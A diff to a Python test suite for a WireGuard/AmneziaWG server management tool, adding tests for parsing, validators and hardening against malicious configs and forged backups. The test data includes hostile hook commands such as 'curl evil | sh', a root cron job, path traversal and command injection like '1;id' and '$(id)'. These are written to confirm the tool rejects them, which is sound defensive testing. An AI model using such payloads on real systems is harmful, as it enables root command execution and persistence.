@@ -82,8 +82,15 @@ chk("2.0 без метки AWG_PROTO", out.strip() == "2.0|10.23.45.0/24|51820|r
 rc, out, _ = bash("clients_tsv")
 rows = [r.split("\t") for r in out.strip().splitlines()]
 chk("клиенты и метки", [r[0] for r in rows] == ["alice", "bob"] and rows[1][3] == "1", out)
-rc, out, _ = bash('conf_marker_set AWG_PROTO 3.1; conf_marker AWG_PROTO; head -3 "$SERVER_CONF"')
+rc, out, _ = bash('conf_marker_set AWG_PROTO 3.1; conf_marker AWG_PROTO; sed -n "1,/^\\[Interface\\]/p" "$SERVER_CONF"')
 chk("метка вставляется в шапку", out.splitlines()[0] == "3.1" and "# AWG_PROTO=3.1" in out, out)
+# Конфиг без шапки (начинается с [Interface]): «1a» ставила метку внутрь секции, где её не видно
+with open(conf, "w") as f:
+    f.write(OLD20[OLD20.index("[Interface]"):])
+rc, out, _ = bash('conf_marker_set AWG_ENDPOINT vpn.example.com; conf_marker AWG_ENDPOINT; head -1 "$SERVER_CONF"')
+chk("метка перед [Interface], когда шапки нет", out.splitlines() == ["vpn.example.com", "# AWG_ENDPOINT=vpn.example.com"], out)
+with open(conf, "w") as f:
+    f.write(OLD20)
 with open(conf, "w") as f:
     f.write(OLD20.replace("H4 = 1610612736-1610620000", "H4 = 4\nHeaderProtectionKey = K=\nRandomTrailers = on"))
 rc, out, _ = bash("server_proto")
@@ -118,6 +125,46 @@ with open(EXIT, "w") as f:
     f.write("[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\nDNS = 1.1.1.1\nTable = auto\n\n[Peer]\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n")
 rc, out, _ = bash(f'py exit-conf-fix "{EXIT}"; cat "{EXIT}"')
 chk("exit-нода: Table = off, без DNS", "Table = off" in out and "DNS" not in out and "Table = auto" not in out, out)
+# Хуки awg-quick выполняются bash от root — из чужого конфига (вставка, бот, бэкап) их быть не должно
+with open(EXIT, "w") as f:
+    f.write("[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\nPostUp = touch /tmp/pwned\nPreDown = true\n"
+            "SaveConfig = true\n\n[Peer]\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n")
+rc, out, _ = bash(f'py exit-conf-fix "{EXIT}"; cat "{EXIT}"')
+chk("exit-нода: PostUp/PreDown/SaveConfig выброшены", "PostUp" not in out and "PreDown" not in out
+    and "SaveConfig" not in out and "Table = off" in out and "Endpoint = 1.2.3.4:51820" in out, out)
+
+# Пиры в записи wireguard-tools: «[Peer] # имя», «[peer]» с отступом, комментарий после значения
+LOOSE = os.path.join(TMP, "loose.conf")
+with open(LOOSE, "w") as f:
+    f.write("[Interface]\nPrivateKey = P\nAddress = 10.5.0.1/24\n\n[Peer] # carol\nPublicKey = PC= # note\n"
+            "AllowedIPs = 10.5.0.2/32\n\n  [peer]\n# dave\nPublicKey=PD=\nAllowedIPs = 10.5.0.3/32\n")
+rc, out, _ = bash(f'py peers "{LOOSE}"')
+rows = [r.split("\t") for r in out.strip("\n").split("\n")]
+chk("пиры в вольной записи видны, имя — и из заголовка", [r[1] for r in rows] == ["PC=", "PD="]
+    and rows[0][2] == "10.5.0.2/32" and [r[0] for r in rows] == ["carol", "dave"], out)
+# Таб для read — пробельный разделитель: пустые колонки TSV схлопывались, и пир без имени
+# получал в имя ключ, а клиент со сроком — чужое orig_ips (показывался заблокированным)
+rc, out, _ = bash(f'SERVER_CONF="{LOOSE}"; clients_name_ip')
+chk("clients_name_ip: колонки не съезжают", out.split() == ["carol|10.5.0.2", "dave|10.5.0.3"], out)
+TSV = os.path.join(TMP, "peers.tsv")
+with open(TSV, "w") as f:
+    f.write("alice\tPUBA=\t10.8.0.2/32\t1800000000\t\tnone\n")
+rc, out, _ = bash(f'clients_tsv() {{ cat "{TSV}"; }}; clients_psv | {{ IFS="|" read -r name pub aip exp orig rest; echo "$exp|$orig|$rest"; }}')
+chk("clients_psv: пустая колонка остаётся пустой", out.strip() == "1800000000||none", out)
+
+# Мастер создания сервера: регион — выбором 1/2, Enter и Ctrl+D — Европа / мир
+picked = [bash('_choose_region; echo "R=$S_REGION"', stdin=s)[1].strip().splitlines()[-1] for s in ("2\n", "\n", "")]
+chk("регион сервера: 2 — Россия, Enter и Ctrl+D — мир", picked == ["R=ru", "R=world", "R=world"], picked)
+rc, out, _ = bash('S_NET=""; _choose_net; echo "N=$S_NET"', stdin="2\n\n")
+chk("подсеть вручную: пустой ввод — случайная, мастер не обрывается",
+    rc == 0 and re.search(r"N=10\.\d+\.\d+\.0/24$", out.strip()), out)
+
+# Валидаторы: ведущие нули — отказ, а не восьмеричное число или ошибка арифметики
+rc, out, err = bash('valid_port 0080 || echo a; valid_port 65536 || echo b; valid_port 0 || echo c; '
+                    'valid_cidr 10.0.0.0/08 || echo d; valid_cidr 10.0.0.0/33 || echo e; '
+                    'valid_port 80 && valid_port 65535 && valid_cidr 10.0.0.0/0 && valid_cidr 10.8.0.0/24 && echo f')
+chk("valid_port/valid_cidr: ведущие нули — отказ без ошибки bash", out.split() == ["a", "b", "c", "d", "e", "f"]
+    and "too great" not in err and "syntax error" not in err, out + err)
 
 WG = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
 os.makedirs(os.path.dirname(WG), exist_ok=True)
@@ -373,6 +420,9 @@ chk("api client del", r.get("ok") and not os.path.exists(os.path.join(ROOT, "roo
 r = api("clients", "bulk", "t:3", "mimicry=none")
 chk("api clients bulk", r.get("ok") and r["data"] == ["t-001", "t-002", "t-003"], r)
 api("clients", "bulk", "z:2", "mimicry=none")
+r = api("clients", "bulk", "past:2", "expire=2020-01-01", "mimicry=none")
+chk("bulk: срок в прошлом отвергается", r.get("ok") is False and "прошёл" in (r.get("error") or "")
+    and not any(c["name"].startswith("past-") for c in api("clients", "list").get("data") or []), r)
 r = api("clients", "del", "z-001, z-002,nobody")
 chk("api clients del — несколько, неизвестные пропускаются",
     r.get("ok") and r["data"] == ["z-001", "z-002"] and "Нет клиента: nobody" in r.get("log", "")
@@ -396,6 +446,33 @@ r = api("exits", "add", "n1", stdin="")
 chk("stdin обязателен для exits add", r.get("ok") is False and "stdin" in r["error"], r)
 r = api("exits", "add", "n1", stdin="[Interface]\nPrivateKey = X\n")
 chk("конфиг ноды читается из stdin", r.get("ok") is False and "Endpoint" in r["error"], r)
+# cascade del: аргументы шли в grep -E как регулярка — «.*» вычищал весь файл правил
+r = api("cascade", "del", ".*", ".*")
+rules = api("cascade", "list").get("data") or []
+chk("api cascade del отвергает не порт", r.get("ok") is False and any(x["in"] == 4443 for x in rules), [r, rules])
+# Новый срок заблокированному клиенту возвращает адрес, а не оставляет его на 127.0.0.2
+api("client", "add", "erin", "mimicry=none")
+rc, out, _ = bash('py meta-set "$SERVER_CONF" erin expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null; '
+                  'client_expire_set erin $(( $(date +%s) + 86400 )) >/dev/null; clients_tsv | grep "^erin"')
+cols = out.strip().split("\t")
+chk("срок заблокированному снимает блокировку", len(cols) >= 5 and cols[2].startswith("10.23.45.") and cols[4] == ""
+    and cols[3].isdigit() and int(cols[3]) > 1e9, repr(out))
+api("client", "del", "erin")
+# Предупреждение о длине I1-I5 — по каждому клиенту отдельно, не суммой по всем
+for n in ("l1", "l2"):
+    with open(os.path.join(ROOT, "root", f"{n}_awg2.conf"), "w") as f:
+        f.write("[Interface]\nPrivateKey = X\nI1 = " + "<b 0x" + "aa" * 1000 + ">\n")
+rc, out, _ = bash("mimicry_module_warnings 2>&1")
+chk("длина I1-I5: два клиента по 2 КБ — без предупреждения", "длиннее" not in out, out)
+with open(os.path.join(ROOT, "root", "l3_awg2.conf"), "w") as f:
+    f.write("[Interface]\nPrivateKey = X\nI1 = " + "<b 0x" + "aa" * 1850 + ">\n")
+rc, out, _ = bash("mimicry_module_warnings 2>&1")
+chk("длина I1-I5: один клиент на 3.7 КБ — предупреждение", "длиннее" in out, out)
+for n in ("l1", "l2", "l3"):
+    os.remove(os.path.join(ROOT, "root", f"{n}_awg2.conf"))
+# json-rows/json-list делят только по \n: U+2028 и \r внутри значения — не новая строка
+rc, out, _ = bash("printf 'n\\tx\\tc1\\xe2\\x80\\xa8c2\\r\\n' | py json-rows name ip on")
+chk("json-rows: U+2028 и \\r не режут строку", json.loads(out) == [{"name": "n", "ip": "x", "on": "c1\u2028c2"}], out)
 rfd, wfd = os.pipe()          # пишущий конец держим открытым до конца вызова
 try:
     out = subprocess.run([API_WRAP, "version"], stdin=rfd, capture_output=True, text=True,
@@ -538,8 +615,122 @@ with open(junk, "wb") as f:
 r = api("backup", "inspect", junk)
 chk("не архив — понятная ошибка без трассировки Python",
     r.get("ok") is False and "это не архив" in r.get("log", "") and "Traceback" not in r.get("log", ""), r)
+# Клиент, созданный после бэкапа, — сирота после восстановления: его конфиг убирается;
+# конфиги клиентов, которые в awg0 бэкапа есть, остаются на месте
+api("client", "add", "late", "mimicry=none")
+LATE = os.path.join(ROOT, "root", "late_awg2.conf")
 r = api("backup", "restore", bk_path)
 chk("восстановление из архива", r.get("ok") and "Восстановлено" in r.get("log", ""), r)
+chk("restore: конфиг клиента не из бэкапа убран, остальные на месте",
+    not os.path.exists(LATE) and os.path.exists(ALICE)
+    and not any(c["name"] == "late" for c in api("clients", "list").get("data") or []), os.listdir(os.path.join(ROOT, "root")))
+
+# Хуки awg-quick выполняются от root. Свои команды Тулзы (1.x и 0.8) проходят,
+# чужие и iptables --modprobe (запускает любую программу) — нет.
+HOOKS = os.path.join(TMP, "hooks.conf")
+rc, out, _ = bash(f'{{ echo "[Interface]"; _postup_lines 10.8.0.0/24 eth0; '
+                  'echo "PostUp = ip link set dev awg0 mtu 1320; echo 1 > /proc/sys/net/ipv4/ip_forward; '
+                  'iptables -t nat -C POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE >/dev/null 2>&1 || '
+                  'iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE"; '
+                  f'}} > "{HOOKS}"; py conf-hooks "{HOOKS}" check')
+chk("хуки Тулзы (1.x и 0.8) — допустимы", rc == 0 and out == "", out)
+with open(HOOKS, "w") as f:
+    f.write("[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT; touch /tmp/x; "
+            "iptables -C X 2>/dev/null || curl evil | sh\nPreUp = iptables --modp=/tmp/x -L\n"
+            "PreDown = ip6tables -M /tmp/x -L\nPostDown = iptables -L $(id)\nSaveConfig = true\n"
+            "\n[Peer]\nPublicKey = P\n")
+rc, out, _ = bash(f'py conf-hooks "{HOOKS}" fix')
+bad = out.splitlines()
+chk("недопустимые команды названы: чужие, --modprobe, подстановка, SaveConfig",
+    rc == 0 and "PostUp\ttouch /tmp/x" in bad and "PostUp\tiptables -C X 2>/dev/null || curl evil | sh" in bad
+    and "PreUp\tiptables --modp=/tmp/x -L" in bad and "PreDown\tip6tables -M /tmp/x -L" in bad
+    and "PostDown\tiptables -L $(id)" in bad and "SaveConfig\tSaveConfig = true" in bad and len(bad) == 6, out)
+with open(HOOKS) as f:
+    fixed = f.read()
+chk("в файле — только допустимое, [Peer] не тронут",
+    fixed == "[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT\n\n[Peer]\nPublicKey = P\n", fixed)
+WGC = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
+os.makedirs(os.path.dirname(WGC), exist_ok=True)
+with open(WGC, "w") as f:
+    f.write("[Interface]\nPrivateKey = X\nPostUp = touch /tmp/x\npostdown = /old/fw.sh down\nListenPort = 1\n")
+rc, out, _ = bash('_wgobf_hooks_reset 2>&1; echo "==="; cat "$WGOBF_WG_CONF"; echo "FW=$WGOBF_FW"')
+said, rest = out.split("===", 1)
+conf_text, fw = rest.rsplit("FW=", 1)
+fw = fw.strip()
+chk("wgobf0 из бэкапа: хуки — ровно скрипт Тулзы, о чужих — предупреждение",
+    conf_text.strip() == f"[Interface]\nPostUp = {fw} up\nPostDown = {fw} down\nPrivateKey = X\nListenPort = 1"
+    and "чужие команды" in said and "touch /tmp/x" in said and "/old/fw.sh down" in said, out)
+
+# Подделанный бэкап: в awg0.conf — команды не из Тулзы, в архиве туннелей —
+# файл вне путей Тулзы, exit-нода с хуком, мусор в каскаде и tun2socks,
+# чужой toml dnscrypt-proxy; в каталоге WARP — «скрипт автозапуска».
+# Прежде tunnels.tar.gz распаковывался прямо в / как есть.
+import io
+import shutil
+import tarfile
+EVIL = os.path.join(TMP, "evil")
+shutil.rmtree(EVIL, ignore_errors=True)
+with tarfile.open(bk_path) as t:
+    t.extractall(EVIL)
+top = os.path.join(EVIL, os.listdir(EVIL)[0])
+with open(os.path.join(top, "awg0.conf")) as f:
+    srv = f.read()
+srv = srv.replace("[Interface]\n", "[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT; "
+                  f"touch {TMP}/pwned\nSaveConfig = true\n", 1)
+with open(os.path.join(top, "awg0.conf"), "w") as f:
+    f.write(srv)
+os.makedirs(os.path.join(top, "warp/wgcf"), exist_ok=True)
+for name, body in (("warp-autostart.sh", f"#!/bin/sh\ntouch {TMP}/pwned\n"), ("wgcf-account.toml", "acct\n")):
+    with open(os.path.join(top, "warp/wgcf", name), "w") as f:
+        f.write(body)
+AWGD = os.path.join(ROOT, "etc/amnezia/amneziawg")
+members = {
+    os.path.join(ROOT, "etc/cron.d/evil"): "* * * * * root touch /tmp/pwned\n",
+    os.path.join(AWGD, "awg-exit-n2.conf"): "[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\n"
+                                            f"PostUp = touch {TMP}/pwned\n\n[Peer]\nPublicKey = P\n"
+                                            "Endpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n",
+    os.path.join(AWGD, "awg-exit-../x.conf"): "[Interface]\n",
+    os.path.join(ROOT, "etc/awg-cascade/rules.conf"): "udp|4443|5.6.7.8|443|ok\nudp|1;id|5.6.7.8|443|bad\n",
+    os.path.join(ROOT, "etc/tun2socks/proxy.txt"): "127.0.0.1:1080;touch x\n",
+    os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml"):
+        "server_names = ['quad9-doh-ip4-port443-nofilter-pri']\n[query_log]\n  file = '/etc/cron.d/x'\n",
+}
+with tarfile.open(os.path.join(top, "tunnels.tar.gz"), "w:gz") as t:
+    for path, body in members.items():
+        data = body.encode()
+        ti = tarfile.TarInfo(path.lstrip("/"))
+        ti.size = len(data)
+        t.addfile(ti, io.BytesIO(data))
+EVIL_TGZ = os.path.join(TMP, "evil_backup.tar.gz")
+with tarfile.open(EVIL_TGZ, "w:gz") as t:
+    t.add(top, arcname=os.path.basename(top))
+r = api("backup", "restore", EVIL_TGZ, "tunnels")
+log = r.get("log", "")
+with open(os.path.join(AWGD, "awg0.conf")) as f:
+    srv = f.read()
+chk("restore чужого бэкапа: из awg0.conf убраны команды не из Тулзы, о них — в итоге",
+    r.get("ok") and "Команды убраны" in log and "pwned" in log and "--dport 2222" in srv
+    and "pwned" not in srv and "SaveConfig" not in srv, [log[-600:], srv[:300]])
+chk("архив туннелей не распаковывается в /: файл вне путей Тулзы не появился",
+    not os.path.exists(os.path.join(ROOT, "etc/cron.d/evil")) and not os.path.exists("/etc/cron.d/evil"))
+EXIT2 = os.path.join(AWGD, "awg-exit-n2.conf")
+with open(EXIT2) as f:
+    ex2 = f.read()
+chk("exit-нода из бэкапа — без хуков, с Table = off", "PostUp" not in ex2 and "Table = off" in ex2
+    and not os.path.exists(os.path.join(AWGD, "x.conf")), ex2)
+with open(os.path.join(ROOT, "etc/awg-cascade/rules.conf")) as f:
+    rules = f.read()
+chk("каскад из бэкапа — только строки по формату", rules == "udp|4443|5.6.7.8|443|ok\n", rules)
+chk("адрес tun2socks не по формату не восстановлен", not os.path.exists(os.path.join(ROOT, "etc/tun2socks/proxy.txt")))
+with open(os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml")) as f:
+    toml = f.read()
+chk("dnscrypt-proxy — шаблон Тулзы, из бэкапа только резолверы",
+    "AWG Toolza" in toml and "server_names = ['quad9-doh-ip4-port443-nofilter-pri']" in toml
+    and "query_log" not in toml and "cron" not in toml, toml)
+chk("WARP: данные аккаунта — да, скрипт автозапуска из бэкапа — нет",
+    os.path.exists(os.path.join(ROOT, "etc/wgcf/wgcf-account.toml"))
+    and not os.path.exists(os.path.join(ROOT, "etc/wgcf/warp-autostart.sh")))
+chk("ничего из бэкапа не выполнилось", not os.path.exists(os.path.join(TMP, "pwned")))
 
 print("Сертификат")
 fake_acme()
